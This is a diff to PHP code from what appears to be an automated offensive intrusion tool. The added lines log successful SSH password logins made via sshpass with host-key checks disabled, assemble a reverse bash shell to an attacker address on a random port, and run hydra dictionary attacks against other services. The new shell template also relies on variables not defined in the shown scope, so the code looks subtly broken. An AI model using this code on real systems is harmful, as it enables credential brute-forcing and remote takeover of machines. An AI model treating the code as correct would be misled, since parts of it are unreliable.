@@ -1688,6 +1688,7 @@ as the header options; the TTL changes.");
 	$this->req_ret_str("mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql_service\"  2>/dev/null ");
 		    if ( $service = $this->mysql_ressource->query($sql_service) ) {
 		        $users = $this->ip2users4passwd();
+		        if (!empty($users))
 		        foreach ($users as $user2name => $user2pass){
 		            if (!empty($user2name)) {
 		            while ($service_row = $service->fetch_assoc()) {
@@ -1699,40 +1700,40 @@ as the header options; the TTL changes.");
 		                
 		                $obj_port = new AUTH($this->eth,$this->domain,$this->ip, $port,$protocol);
 		                if ($service_row['service2name']==="ssh"){
-		                    $test = new SERVICE4COM($obj_port->eth,$obj_port->domain,$obj_port->ip, $obj_port->port,$obj_port->protocol);
+		                    $test = new SERVICE($obj_port->eth,$obj_port->domain,$obj_port->ip, $obj_port->port,$obj_port->protocol);
 		                    $test->poc($this->flag_poc);
 		                    $stream = $test->stream8ssh8passwd($test->ip, $test->port, $user2name,$user2pass);
-		                    
-		                    $template_cmd = "sshpass -p '$user2pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $user2name@$test->ip -p $test->port -C  '%CMD%'";
-		                    list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$user2name,$user2pass);
-		                    
-		                    if (is_resource($stream)){
-		                        $templateB64_id = base64_encode($template_id);
-		                        $templateB64_cmd = base64_encode($template_cmd);
+		                     if(is_resource($stream)){
+		                        $info = "SSH user/pass $user2name/$user2pass";
+		                        $this->log2succes($info);
+		                        $template_shell = "sshpass -p '$user2pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
 		                        $templateB64_shell = base64_encode($template_shell);
+		                        $attacker_ip = $this->ip4addr4target($this->ip);
+		                        $attacker_port = rand(1024,65535);
+		                        $shell = "/bin/bash";
+		                        $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
+		                        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
 		                        
-		                        $data = "/usr/bin/id";
-		                        $rst_id = $test->req_str($stream, $data, 10," | grep 'uid=' ");
-		                        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
-		                        $id8b64 = base64_encode($id);
-		                        $this->article("CREATE Template ID", $template_id);
-		                        $this->article("CREATE Template CMD", $template_cmd);
-		                        $this->article("CREATE Template SHELL", $template_shell);
-		                        $this->pause();
-		                        $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$user2pass);
-		                        $obj_lan->poc($test->flag_poc);
-		                        
-		                        $obj_lan->lan4root();
+		                        $lprotocol = 'T' ;
+		                        $type = "server";
+		                        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
 		                    }
 		                }
 		                
 		                else $obj_port->port2auth4pass4hydra($service_row['service2name'], $user2name,$user2pass);
 		                
 		                
-		                //$obj_port->port2auth4dico4hydra($service_row['service2name'],$auth_row['user2name']);
+		                //
 		                		            }
 		            }
 		    }
+		        $users = $this->ip2users4shell();
+		        if (!empty($users))
+		            foreach ($users as $user2name){
+		                if (!empty($user2name)) {
+		                    $obj_port->port2auth4dico4hydra($service_row['service2name'],$user2name);
+		                }
+		        }
 	    }
 	    
 }
